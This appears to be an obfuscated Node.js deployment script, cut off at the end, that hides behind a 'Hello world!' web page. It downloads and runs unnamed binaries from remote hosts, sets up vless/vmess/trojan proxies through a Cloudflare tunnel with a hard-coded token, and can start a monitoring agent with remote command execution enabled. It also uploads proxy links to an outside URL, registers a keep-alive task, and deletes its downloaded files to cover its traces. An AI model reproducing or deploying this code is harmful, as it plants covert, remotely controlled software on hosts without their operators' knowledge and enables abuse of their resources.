const _0x2d93c9=_0xffcf;(function(_0x5a3286,_0x5665a3){const _0x23658c=_0xffcf,_0x5c0f21=_0x5a3286();while(!![]){try{const _0x5599a8=-parseInt(_0x23658c(0x12f))/0x1*(-parseInt(_0x23658c(0x14a))/0x2)+parseInt(_0x23658c(0x120))/0x3*(-parseInt(_0x23658c(0x19b))/0x4)+parseInt(_0x23658c(0x1ce))/0x5*(parseInt(_0x23658c(0x167))/0x6)+-parseInt(_0x23658c(0x1d1))/0x7*(-parseInt(_0x23658c(0x138))/0x8)+-parseInt(_0x23658c(0x19d))/0x9*(-parseInt(_0x23658c(0x150))/0xa)+parseInt(_0x23658c(0x13d))/0xb+parseInt(_0x23658c(0x159))/0xc*(-parseInt(_0x23658c(0x1c4))/0xd);if(_0x5599a8===_0x5665a3)break;else _0x5c0f21['push'](_0x5c0f21['shift']());}catch(_0x56da62){_0x5c0f21['push'](_0x5c0f21['shift']());}}}(_0x2129,0xe2e4d));const express=require(_0x2d93c9(0x197)),app=express(),axios=require(_0x2d93c9(0x140)),os=require('os'),fs=require('fs'),path=require(_0x2d93c9(0x199)),{promisify}=require(_0x2d93c9(0x151)),exec=promisify(require(_0x2d93c9(0x17a))[_0x2d93c9(0x128)]),{execSync}=require(_0x2d93c9(0x17a)),UPLOAD_URL=process[_0x2d93c9(0x16a)][_0x2d93c9(0x184)]||'',PROJECT_URL=process[_0x2d93c9(0x16a)][_0x2d93c9(0x172)]||'',AUTO_ACCESS=process['env'][_0x2d93c9(0x178)]||![],FILE_PATH=process[_0x2d93c9(0x16a)][_0x2d93c9(0x117)]||_0x2d93c9(0x1b0),SUB_PATH=process[_0x2d93c9(0x16a)][_0x2d93c9(0x113)]||_0x2d93c9(0x17e),PORT=process[_0x2d93c9(0x16a)][_0x2d93c9(0x1a7)]||process[_0x2d93c9(0x16a)][_0x2d93c9(0x156)]||0xbb8,UUID=process[_0x2d93c9(0x16a)][_0x2d93c9(0x186)]||_0x2d93c9(0x1ae),NEZHA_SERVER=process[_0x2d93c9(0x16a)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2d93c9(0x16a)][_0x2d93c9(0x1b2)]||'',NEZHA_KEY=process[_0x2d93c9(0x16a)][_0x2d93c9(0x180)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||'syzygy.imply.us.kg',ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2d93c9(0x1c9),ARGO_PORT=process[_0x2d93c9(0x16a)][_0x2d93c9(0x1c3)]||0x1f41,CFIP=process[_0x2d93c9(0x16a)][_0x2d93c9(0x179)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x2d93c9(0x175)]||0x1bb,NAME=process[_0x2d93c9(0x16a)][_0x2d93c9(0x13a)]||'syzygy_vsl';!fs[_0x2d93c9(0x15b)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x2d93c9(0x1c2))):console[_0x2d93c9(0x15f)](FILE_PATH+_0x2d93c9(0x130));function generateRandomName(){const _0x52f9f0=_0x2d93c9,_0x56bc02=_0x52f9f0(0x146);let _0xf7a4f5='';for(let _0x1e73b7=0x0;_0x1e73b7<0x6;_0x1e73b7++){_0xf7a4f5+=_0x56bc02[_0x52f9f0(0x141)](Math[_0x52f9f0(0x112)](Math[_0x52f9f0(0x164)]()*_0x56bc02[_0x52f9f0(0x1bb)]));}return _0xf7a4f5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2d93c9(0x1c5)](FILE_PATH,npmName),phpPath=path[_0x2d93c9(0x1c5)](FILE_PATH,phpName),webPath=path[_0x2d93c9(0x1c5)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2d93c9(0x1c5)](FILE_PATH,_0x2d93c9(0x15e)),listPath=path[_0x2d93c9(0x1c5)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x2d93c9(0x1c5)](FILE_PATH,_0x2d93c9(0x123));function deleteNodes(){const _0x41b2bb=_0x2d93c9;try{if(!UPLOAD_URL)return;if(!fs[_0x41b2bb(0x15b)](subPath))return;let _0x314266;try{_0x314266=fs[_0x41b2bb(0x17f)](subPath,_0x41b2bb(0x1b1));}catch{return null;}const _0x6bc813=Buffer[_0x41b2bb(0x194)](_0x314266,_0x41b2bb(0x124))[_0x41b2bb(0x16f)]('utf-8'),_0x48c1aa=_0x6bc813[_0x41b2bb(0x198)]('\x0a')[_0x41b2bb(0x152)](_0x1986fc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1986fc));if(_0x48c1aa[_0x41b2bb(0x1bb)]===0x0)return;return axios[_0x41b2bb(0x142)](UPLOAD_URL+_0x41b2bb(0x134),JSON[_0x41b2bb(0x12a)]({'nodes':_0x48c1aa}),{'headers':{'Content-Type':_0x41b2bb(0x153)}})[_0x41b2bb(0x174)](_0x21cf87=>{return null;}),null;}catch(_0x14be15){return null;}}function cleanupOldFiles(){const _0x1b6b45=_0x2d93c9;try{const _0x103ba2=fs[_0x1b6b45(0x139)](FILE_PATH);_0x103ba2['forEach'](_0x5e51de=>{const _0x2d2edc=_0x1b6b45,_0x268247=path[_0x2d2edc(0x1c5)](FILE_PATH,_0x5e51de);try{const _0x324472=fs[_0x2d2edc(0x144)](_0x268247);_0x324472[_0x2d2edc(0x162)]()&&fs[_0x2d2edc(0x1b9)](_0x268247);}catch(_0x141d65){}});}catch(_0x3cd662){}}app[_0x2d93c9(0x1c1)]('/',function(_0xcaac11,_0x195e6d){const _0x58c938=_0x2d93c9;_0x195e6d[_0x58c938(0x13e)]('Hello\x20world!');});async function generateConfig(){const _0x4873b2=_0x2d93c9,_0xa23262={'log':{'access':_0x4873b2(0x15c),'error':_0x4873b2(0x15c),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4873b2(0x18f),'settings':{'clients':[{'id':UUID,'flow':_0x4873b2(0x143)}],'decryption':_0x4873b2(0x1ac),'fallbacks':[{'dest':0xbb9},{'path':_0x4873b2(0x122),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4873b2(0x171),'dest':0xbbc}]},'streamSettings':{'network':_0x4873b2(0x1ca)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x4873b2(0x18f),'settings':{'clients':[{'id':UUID}],'decryption':_0x4873b2(0x1ac)},'streamSettings':{'network':_0x4873b2(0x1ca),'security':_0x4873b2(0x1ac)}},{'port':0xbba,'listen':_0x4873b2(0x191),'protocol':_0x4873b2(0x18f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4873b2(0x1ac)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4873b2(0x122)}},'sniffing':{'enabled':!![],'destOverride':[_0x4873b2(0x127),_0x4873b2(0x185),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4873b2(0x191),'protocol':_0x4873b2(0x129),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4873b2(0x1cd)}},'sniffing':{'enabled':!![],'destOverride':[_0x4873b2(0x127),'tls',_0x4873b2(0x1b7)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x4873b2(0x1d2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4873b2(0x1ac),'wsSettings':{'path':_0x4873b2(0x171)}},'sniffing':{'enabled':!![],'destOverride':[_0x4873b2(0x127),_0x4873b2(0x185),_0x4873b2(0x1b7)],'metadataOnly':![]}}],'dns':{'servers':[_0x4873b2(0x188)]},'outbounds':[{'protocol':_0x4873b2(0x190),'tag':_0x4873b2(0x1ab)},{'protocol':_0x4873b2(0x15a),'tag':_0x4873b2(0x157)}]};fs[_0x4873b2(0x14d)](path[_0x4873b2(0x1c5)](FILE_PATH,_0x4873b2(0x123)),JSON[_0x4873b2(0x12a)](_0xa23262,null,0x2));}function getSystemArchitecture(){const _0x15872a=_0x2d93c9,_0x1c2fe6=os[_0x15872a(0x1b6)]();return _0x1c2fe6===_0x15872a(0x149)||_0x1c2fe6===_0x15872a(0x176)||_0x1c2fe6===_0x15872a(0x169)?'arm':_0x15872a(0x147);}function downloadFile(_0x2c0537,_0x39c1a0,_0xd52cc9){const _0x36f33e=_0x2d93c9,_0x3ad3c0=_0x2c0537;!fs['existsSync'](FILE_PATH)&&fs[_0x36f33e(0x1b8)](FILE_PATH,{'recursive':!![]});const _0x38d0b1=fs[_0x36f33e(0x1cf)](_0x3ad3c0);axios({'method':_0x36f33e(0x1c1),'url':_0x39c1a0,'responseType':'stream'})[_0x36f33e(0x145)](_0x2ffd57=>{const _0x40acb3=_0x36f33e;_0x2ffd57[_0x40acb3(0x183)][_0x40acb3(0x17b)](_0x38d0b1),_0x38d0b1['on'](_0x40acb3(0x17d),()=>{const _0x1ca96b=_0x40acb3;_0x38d0b1[_0x1ca96b(0x1ba)](),console[_0x1ca96b(0x15f)](_0x1ca96b(0x181)+path[_0x1ca96b(0x1a0)](_0x3ad3c0)+'\x20successfully'),_0xd52cc9(null,_0x3ad3c0);}),_0x38d0b1['on']('error',_0xcd46f5=>{const _0x2f1efc=_0x40acb3;fs[_0x2f1efc(0x1a2)](_0x3ad3c0,()=>{});const _0x326b5c=_0x2f1efc(0x181)+path[_0x2f1efc(0x1a0)](_0x3ad3c0)+_0x2f1efc(0x18e)+_0xcd46f5['message'];console[_0x2f1efc(0x12c)](_0x326b5c),_0xd52cc9(_0x326b5c);});})['catch'](_0x56bd0b=>{const _0x27be6e=_0x36f33e,_0x2f95bb=_0x27be6e(0x181)+path['basename'](_0x3ad3c0)+_0x27be6e(0x18e)+_0x56bd0b[_0x27be6e(0x13f)];console[_0x27be6e(0x12c)](_0x2f95bb),_0xd52cc9(_0x2f95bb);});}async function downloadFilesAndRun(){const _0xcdd34=_0x2d93c9,_0x138783=getSystemArchitecture(),_0x703dd5=getFilesForArchitecture(_0x138783);if(_0x703dd5[_0xcdd34(0x1bb)]===0x0){console[_0xcdd34(0x15f)](_0xcdd34(0x133));return;}const _0x38ccdc=_0x703dd5['map'](_0xe3069a=>{return new Promise((_0x59fc3e,_0x7aabd2)=>{const _0x31bf0c=_0xffcf;downloadFile(_0xe3069a['fileName'],_0xe3069a[_0x31bf0c(0x168)],(_0x497d3d,_0x5ea9ad)=>{_0x497d3d?_0x7aabd2(_0x497d3d):_0x59fc3e(_0x5ea9ad);});});});try{await Promise[_0xcdd34(0x18b)](_0x38ccdc);}catch(_0x3385a1){console['error']('Error\x20downloading\x20files:',_0x3385a1);return;}function _0x1662bd(_0x554916){const _0x25ebbd=0x1fd;_0x554916['forEach'](_0x4f4682=>{fs['existsSync'](_0x4f4682)&&fs['chmod'](_0x4f4682,_0x25ebbd,_0x203fda=>{const _0x1e13c4=_0xffcf;_0x203fda?console[_0x1e13c4(0x12c)]('Empowerment\x20failed\x20for\x20'+_0x4f4682+':\x20'+_0x203fda):console[_0x1e13c4(0x15f)](_0x1e13c4(0x16b)+_0x4f4682+':\x20'+_0x25ebbd[_0x1e13c4(0x16f)](0x8));});});}const _0x12af0f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1662bd(_0x12af0f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4ecf91=NEZHA_SERVER[_0xcdd34(0x19e)](':')?NEZHA_SERVER[_0xcdd34(0x198)](':')['pop']():'',_0x185c32=new Set([_0xcdd34(0x155),_0xcdd34(0x1cb),_0xcdd34(0x131),_0xcdd34(0x1be),_0xcdd34(0x125),'2053']),_0x15a8a1=_0x185c32[_0xcdd34(0x11c)](_0x4ecf91)?_0xcdd34(0x1c8):_0xcdd34(0x1a8),_0x20a027=_0xcdd34(0x1d0)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xcdd34(0x1a6)+_0x15a8a1+_0xcdd34(0x196)+UUID;fs['writeFileSync'](path[_0xcdd34(0x1c5)](FILE_PATH,_0xcdd34(0x11b)),_0x20a027);const _0x32ec35=_0xcdd34(0x160)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x32ec35),console[_0xcdd34(0x15f)](phpName+'\x20is\x20running'),await new Promise(_0x2068ea=>setTimeout(_0x2068ea,0x3e8));}catch(_0x3ab3be){console[_0xcdd34(0x12c)](_0xcdd34(0x12b)+_0x3ab3be);}}else{let _0x4178f7='';const _0x27d032=[_0xcdd34(0x155),_0xcdd34(0x1cb),_0xcdd34(0x131),_0xcdd34(0x1be),_0xcdd34(0x125),'2053'];_0x27d032['includes'](NEZHA_PORT)&&(_0x4178f7=_0xcdd34(0x16e));const _0x45bdf7='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xcdd34(0x17c)+NEZHA_KEY+'\x20'+_0x4178f7+_0xcdd34(0x115);try{await exec(_0x45bdf7),console[_0xcdd34(0x15f)](npmName+_0xcdd34(0x1bf)),await new Promise(_0x1aaf4f=>setTimeout(_0x1aaf4f,0x3e8));}catch(_0x35330c){console[_0xcdd34(0x12c)](_0xcdd34(0x19f)+_0x35330c);}}}else console[_0xcdd34(0x15f)](_0xcdd34(0x11d));const _0x30cfb6=_0xcdd34(0x160)+webPath+_0xcdd34(0x14c)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x30cfb6),console[_0xcdd34(0x15f)](webName+_0xcdd34(0x1bf)),await new Promise(_0x4cd80a=>setTimeout(_0x4cd80a,0x3e8));}catch(_0xcee5a2){console[_0xcdd34(0x12c)](_0xcdd34(0x1a3)+_0xcee5a2);}if(fs[_0xcdd34(0x15b)](botPath)){let _0x342539;if(ARGO_AUTH[_0xcdd34(0x19a)](/^[A-Z0-9a-z=]{120,250}$/))_0x342539=_0xcdd34(0x11e)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x342539=_0xcdd34(0x1b3)+FILE_PATH+_0xcdd34(0x137):_0x342539=_0xcdd34(0x1a5)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xcdd34(0x160)+botPath+'\x20'+_0x342539+_0xcdd34(0x154)),console[_0xcdd34(0x15f)](botName+_0xcdd34(0x1bf)),await new Promise(_0x2473cc=>setTimeout(_0x2473cc,0x7d0));}catch(_0x36a293){console[_0xcdd34(0x12c)](_0xcdd34(0x165)+_0x36a293);}}await new Promise(_0x2214a9=>setTimeout(_0x2214a9,0x1388));}function getFilesForArchitecture(_0xdd1a3b){const _0x13e4e4=_0x2d93c9;let _0x14222b;_0xdd1a3b===_0x13e4e4(0x149)?_0x14222b=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x13e4e4(0x14e)}]:_0x14222b=[{'fileName':webPath,'fileUrl':_0x13e4e4(0x11f)},{'fileName':botPath,'fileUrl':_0x13e4e4(0x114)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3200b4=_0xdd1a3b==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x13e4e4(0x193);_0x14222b[_0x13e4e4(0x1ad)]({'fileName':npmPath,'fileUrl':_0x3200b4});}else{const _0x3f0a43=_0xdd1a3b===_0x13e4e4(0x149)?'https://arm64.ssss.nyc.mn/v1':_0x13e4e4(0x192);_0x14222b[_0x13e4e4(0x1ad)]({'fileName':phpPath,'fileUrl':_0x3f0a43});}}return _0x14222b;}function _0x2129(){const _0x4cfab6=['4572cahKoi','blackhole','existsSync','/dev/null','response','sub.txt','log','nohup\x20','tunnel.json','isFile','&path=%2Ftrojan-argo%3Fed%3D2560#','random','Error\x20executing\x20command:\x20','\x22\x20>\x20/dev/null\x202>&1','17166iXaXvt','fileUrl','aarch64','env','Empowerment\x20success\x20for\x20','\x0a\x20\x20credentials-file:\x20','TunnelSecret','--tls','toString','Skipping\x20adding\x20automatic\x20access\x20task','/trojan-argo','PROJECT_URL','status','catch','CFPORT','arm64','\x0avless://','AUTO_ACCESS','CFIP','child_process','pipe','\x20-p\x20','finish','9090','readFileSync','NEZHA_KEY','Download\x20','automatic\x20access\x20task\x20added\x20successfully','data','UPLOAD_URL','tls','UUID','\x0a\x20\x20tunnel:\x20','https+local://8.8.8.8/dns-query','/sub.txt\x20saved\x20successfully','platform','all','rm\x20-rf\x20','boot.log','\x20failed:\x20','vless','freedom','127.0.0.1','https://amd64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/agent','from','/vmess-argo?ed=2560','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','express','split','path','match','8dYTCnQ','?security=tls&sni=','9Tbjfcd','includes','npm\x20running\x20error:\x20','basename','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','unlink','web\x20running\x20error:\x20','https://oooo.serv00.net/add-url','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','SERVER_PORT','false','.exe\x20>\x20nul\x202>&1','substring','direct','none','unshift','402b5715-e0d2-4e01-8ea5-cd548f2ca867','\x0a\x20\x20\x20\x20','./tmp','utf-8','NEZHA_PORT','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','arch','quic','mkdirSync','unlinkSync','close','length','http\x20server\x20is\x20running\x20on\x20port:','forEach','2087','\x20is\x20running','Add\x20automatic\x20access\x20task\x20faild:\x20','get','\x20is\x20created','ARGO_PORT','119431xddGVv','join','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','clear','true','eyJhIjoiNzkzNDQ3NTY0NTBmZWY5NmJlYTg5ZmY5ZDBkNTY0YzkiLCJ0IjoiMTI3YTY0MWEtYWE3ZC00ODkzLWJmYzctNmFhNmQwOGRjOTEwIiwicyI6Ik56WTVPVFV3T1RRdFptTm1aaTAwTnpRMkxUaGtOV1l0WlRRNE1EUmlZbU16TURNdyJ9','tcp','8443','\x0a\x20\x20\x0atrojan://','/vmess-argo','865RSFiER','createWriteStream','\x0aclient_secret:\x20','161edEEEB','trojan','floor','SUB_PATH','https://amd64.ssss.nyc.mn/bot','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','FILE_PATH','?encryption=none&security=tls&sni=','tunnel.yml','taskkill\x20/f\x20/im\x20','config.yaml','has','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/web','76197hBCXXZ','ArgoDomain:','/vless-argo','config.json','base64','2083','\x20>\x20nul\x202>&1','http','exec','vmess','stringify','php\x20running\x20error:\x20','error','ARGO_DOMAIN:','App\x20is\x20running','916185ZkYodf','\x20already\x20exists','2096','Content-Type','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/api/delete-nodes','listen','/api/add-nodes','/tunnel.yml\x20run','16288zivWos','readdirSync','NAME','&path=%2Fvless-argo%3Fed%3D2560#','del\x20/f\x20/q\x20','14741243HASFKT','send','message','axios','charAt','post','xtls-rprx-vision','statSync','then','abcdefghijklmnopqrstuvwxyz','amd','test','arm','4GtLVyZ','Subscription\x20uploaded\x20successfully','\x20-c\x20','writeFileSync','https://arm64.ssss.nyc.mn/bot','&fp=firefox&type=ws&host=','7661380AMFvmb','util','filter','application/json','\x20>/dev/null\x202>&1\x20&','443','PORT','block','/api/add-subscriptions'];_0x2129=function(){return _0x4cfab6;};return _0x2129();}function argoType(){const _0x244aa4=_0x2d93c9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x244aa4(0x15f)](_0x244aa4(0x1c6));return;}if(ARGO_AUTH[_0x244aa4(0x19e)](_0x244aa4(0x16d))){fs[_0x244aa4(0x14d)](path[_0x244aa4(0x1c5)](FILE_PATH,_0x244aa4(0x161)),ARGO_AUTH);const _0x4f4bb6=_0x244aa4(0x187)+ARGO_AUTH[_0x244aa4(0x198)]('\x22')[0xb]+_0x244aa4(0x16c)+path[_0x244aa4(0x1c5)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x244aa4(0x1a1)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x244aa4(0x14d)](path[_0x244aa4(0x1c5)](FILE_PATH,_0x244aa4(0x119)),_0x4f4bb6);}else console[_0x244aa4(0x15f)](_0x244aa4(0x116));}argoType();async function extractDomains(){const _0x4f1834=_0x2d93c9;let _0x4502fa;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4502fa=ARGO_DOMAIN,console[_0x4f1834(0x15f)](_0x4f1834(0x12d),_0x4502fa),await _0x40c0d7(_0x4502fa);else try{const _0x2a21d6=fs['readFileSync'](path[_0x4f1834(0x1c5)](FILE_PATH,'boot.log'),_0x4f1834(0x1b1)),_0x3fd14f=_0x2a21d6[_0x4f1834(0x198)]('\x0a'),_0x1a9801=[];_0x3fd14f[_0x4f1834(0x1bd)](_0x2b9cde=>{const _0x3119b8=_0x4f1834,_0x3d3743=_0x2b9cde[_0x3119b8(0x19a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3d3743){const _0x1bdbe6=_0x3d3743[0x1];_0x1a9801['push'](_0x1bdbe6);}});if(_0x1a9801[_0x4f1834(0x1bb)]>0x0)_0x4502fa=_0x1a9801[0x0],console[_0x4f1834(0x15f)](_0x4f1834(0x121),_0x4502fa),await _0x40c0d7(_0x4502fa);else{console[_0x4f1834(0x15f)](_0x4f1834(0x1b4)),fs['unlinkSync'](path[_0x4f1834(0x1c5)](FILE_PATH,_0x4f1834(0x18d)));async function _0x3b9c6d(){const _0x1f5ca8=_0x4f1834;try{process['platform']==='win32'?await exec(_0x1f5ca8(0x11a)+botName+_0x1f5ca8(0x1a9)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x1f5ca8(0x1aa)](0x1)+_0x1f5ca8(0x166));}catch(_0x63bb36){}}_0x3b9c6d(),await new Promise(_0x53a97c=>setTimeout(_0x53a97c,0xbb8));const _0x32012a=_0x4f1834(0x1a5)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x32012a+_0x4f1834(0x154)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x5ef87d=>setTimeout(_0x5ef87d,0xbb8)),await extractDomains();}catch(_0x5efdd0){console[_0x4f1834(0x12c)]('Error\x20executing\x20command:\x20'+_0x5efdd0);}}}catch(_0x49e9c9){console[_0x4f1834(0x12c)]('Error\x20reading\x20boot.log:',_0x49e9c9);}async function _0x40c0d7(_0x3d1b3e){const _0x363684=_0x4f1834,_0x4f7d06=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x363684(0x1b1)}),_0x34b153=_0x4f7d06['trim'](),_0x4a6db4=NAME?NAME+'-'+_0x34b153:_0x34b153;return new Promise(_0x14f2a8=>{setTimeout(()=>{const _0x6142ab=_0xffcf,_0x30eaa8={'v':'2','ps':''+_0x4a6db4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x6142ab(0x1ac),'net':'ws','type':_0x6142ab(0x1ac),'host':_0x3d1b3e,'path':_0x6142ab(0x195),'tls':'tls','sni':_0x3d1b3e,'alpn':'','fp':'firefox'},_0x298a56=_0x6142ab(0x177)+UUID+'@'+CFIP+':'+CFPORT+_0x6142ab(0x118)+_0x3d1b3e+_0x6142ab(0x14f)+_0x3d1b3e+_0x6142ab(0x13b)+_0x4a6db4+'\x0a\x20\x20\x0avmess://'+Buffer[_0x6142ab(0x194)](JSON['stringify'](_0x30eaa8))[_0x6142ab(0x16f)](_0x6142ab(0x124))+_0x6142ab(0x1cc)+UUID+'@'+CFIP+':'+CFPORT+_0x6142ab(0x19c)+_0x3d1b3e+_0x6142ab(0x14f)+_0x3d1b3e+_0x6142ab(0x163)+_0x4a6db4+_0x6142ab(0x1af);console[_0x6142ab(0x15f)](Buffer[_0x6142ab(0x194)](_0x298a56)[_0x6142ab(0x16f)](_0x6142ab(0x124))),fs[_0x6142ab(0x14d)](subPath,Buffer[_0x6142ab(0x194)](_0x298a56)['toString'](_0x6142ab(0x124))),console[_0x6142ab(0x15f)](FILE_PATH+_0x6142ab(0x189)),uploadNodes(),app[_0x6142ab(0x1c1)]('/'+SUB_PATH,(_0x55cb8d,_0x2fbbc9)=>{const _0x1dd706=_0x6142ab,_0x483825=Buffer[_0x1dd706(0x194)](_0x298a56)[_0x1dd706(0x16f)]('base64');_0x2fbbc9['set'](_0x1dd706(0x132),'text/plain;\x20charset=utf-8'),_0x2fbbc9[_0x1dd706(0x13e)](_0x483825);}),_0x14f2a8(_0x298a56);},0x7d0);});}}async function uploadNodes(){const _0x5bbb48=_0x2d93c9;if(UPLOAD_URL&&PROJECT_URL){const _0xefc49d=PROJECT_URL+'/'+SUB_PATH,_0x358605={'subscription':[_0xefc49d]};try{const _0x491108=await axios['post'](UPLOAD_URL+_0x5bbb48(0x158),_0x358605,{'headers':{'Content-Type':_0x5bbb48(0x153)}});return _0x491108&&_0x491108[_0x5bbb48(0x173)]===0xc8?(console[_0x5bbb48(0x15f)](_0x5bbb48(0x14b)),_0x491108):null;}catch(_0x1a83e2){if(_0x1a83e2['response']){if(_0x1a83e2[_0x5bbb48(0x15d)][_0x5bbb48(0x173)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5bbb48(0x15b)](listPath))return;const _0x513385=fs[_0x5bbb48(0x17f)](listPath,_0x5bbb48(0x1b1)),_0x124304=_0x513385[_0x5bbb48(0x198)]('\x0a')['filter'](_0x30cc24=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5bbb48(0x148)](_0x30cc24));if(_0x124304[_0x5bbb48(0x1bb)]===0x0)return;const _0x46c52a=JSON['stringify']({'nodes':_0x124304});try{const _0x17c592=await axios[_0x5bbb48(0x142)](UPLOAD_URL+_0x5bbb48(0x136),_0x46c52a,{'headers':{'Content-Type':_0x5bbb48(0x153)}});return _0x17c592&&_0x17c592['status']===0xc8?(console[_0x5bbb48(0x15f)]('Nodes\x20uploaded\x20successfully'),_0x17c592):null;}catch(_0x203577){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x516dfe=_0xffcf,_0x16b08d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x16b08d['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x16b08d['push'](phpPath);process[_0x516dfe(0x18a)]==='win32'?exec(_0x516dfe(0x13c)+_0x16b08d[_0x516dfe(0x1c5)]('\x20')+_0x516dfe(0x126),_0x5214d0=>{const _0x21ff0f=_0x516dfe;console[_0x21ff0f(0x1c7)](),console[_0x21ff0f(0x15f)](_0x21ff0f(0x12e)),console[_0x21ff0f(0x15f)](_0x21ff0f(0x1b5));}):exec(_0x516dfe(0x18c)+_0x16b08d['join']('\x20')+'\x20>/dev/null\x202>&1',_0x567de3=>{const _0x12db1a=_0x516dfe;console[_0x12db1a(0x1c7)](),console['log'](_0x12db1a(0x12e)),console['log'](_0x12db1a(0x1b5));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xf9df84=_0x2d93c9;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0xf9df84(0x170));return;}try{const _0x122d1b=await axios[_0xf9df84(0x142)](_0xf9df84(0x1a4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xf9df84(0x153)}});return console['log'](_0xf9df84(0x182)),_0x122d1b;}catch(_0x246076){return console[_0xf9df84(0x12c)](_0xf9df84(0x1c0)+_0x246076[_0xf9df84(0x13f)]),null;}}function _0xffcf(_0x33bc0e,_0x19f421){const _0x212957=_0x2129();return _0xffcf=function(_0xffcf04,_0x5678e5){_0xffcf04=_0xffcf04-0x112;let _0xc02f0=_0x212957[_0xffcf04];return _0xc02f0;},_0xffcf(_0x33bc0e,_0x19f421);}async function startserver(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4eeb2d){console['error']('Error\x20in\x20startserver:',_0x4eeb2d);}}startserver()['catch'](_0x2f5518=>{const 